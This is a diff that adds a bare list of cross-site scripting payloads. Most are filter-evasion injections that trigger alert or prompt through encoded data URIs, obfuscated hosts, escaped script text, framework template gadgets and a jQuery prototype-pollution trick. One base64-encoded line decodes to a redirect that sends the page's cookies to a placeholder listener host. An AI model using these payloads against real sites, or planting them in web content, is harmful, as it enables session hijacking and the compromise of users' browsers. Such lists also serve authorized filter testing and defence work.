@@ -1,0 +1,29 @@
+x"><svG onLoad=prompt(window.origin)>
+<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+eCI+PHN2RyBvbkxvYWQ9cHJvbXB0KHdpbmRvdy5vcmlnaW4pPg==
+</script><script>alert('XSS');</script>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY ONLOAD=alert('XSS')>
+¼script¾alert(¢XSS¢)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
+<A HREF="h tt  p://6   6.000146.0x7.147/">XSS</A>
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video> <source onerror = "javascript: alert (XSS)">
+"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src="x:x" onerror="alert(XSS)">
+<style>//*{x:expression(alert(/xss/))}//<style></style>';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//{{$emit.constructor`alert(1)`()}}
+<x @[_openBlock.constructor`alert(1)`()]>
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<script>\u0061lert(1)</script><script>
+Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';$(document).off('foobar');</script>
